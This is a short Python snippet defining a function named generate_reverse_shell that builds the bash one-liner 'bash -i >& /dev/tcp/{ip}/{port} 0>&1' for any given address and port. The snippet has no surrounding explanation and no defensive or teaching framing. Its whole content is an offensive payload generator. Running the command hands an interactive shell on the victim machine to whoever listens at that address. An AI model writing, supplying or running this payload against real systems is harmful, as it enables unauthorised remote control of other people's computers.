def generate_reverse_shell(ip, port):
    return f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
